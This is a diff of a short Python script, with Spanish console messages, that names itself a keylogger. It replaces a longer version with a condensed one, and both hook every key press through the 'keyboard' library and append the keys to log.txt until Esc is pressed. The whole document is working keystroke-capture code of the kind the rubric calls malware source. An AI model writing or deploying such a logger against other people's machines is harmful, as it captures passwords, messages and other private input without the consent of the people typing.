@@ -1,31 +1,13 @@
 import keyboard
-import os
-keylogger_file = "log.txt"
-def on_key_event(event):
+
+def on_key(event):
     if event.event_type == keyboard.KEY_DOWN:
-        key_name = event.name
-        if len(key_name) > 1:
-            log_entry = f"[{key_name.upper()}]\n"
-        else:
-            log_entry = f"Tecla: '{key_name}'\n"
-        print(f"Registrando: {log_entry.strip()}") 
-        try:
-            with open(keylogger_file, "a", encoding="utf-8") as f:
-                f.write(log_entry)
-        except Exception as e:
-            print(f"[!] Error al escribir en el archivo de log: {e}")
-def main():
-    print("Keylogger iniciado. Presiona 'Esc' para detener.")
-    print(f"Los logs se guardarán en: {os.path.abspath(keylogger_file)}")
-    try:
-        keyboard.hook(on_key_event)
-        keyboard.wait('esc')
-    except KeyboardInterrupt:
-        print("\n[!] Detención por interrupción de teclado (Ctrl+C).")
-    except Exception as e:
-        print(f"\n[!] Ocurrió un error: {e}")
-    finally:
-        keyboard.unhook_all()
-        print("Keylogger detenido. Revisar el archivo de log.")
-if __name__ == "__main__":
-    main()
+        key = event.name.upper() if len(event.name) > 1 else event.name
+        print(f"Tecla: {key}")
+        with open("log.txt", "a", encoding="utf-8") as f:
+            f.write(f"{key}\n")
+
+print("Keylogger iniciado. Presiona 'Esc' para detener.")
+keyboard.hook(on_key)
+keyboard.wait('esc')
+print("Keylogger detenido.")
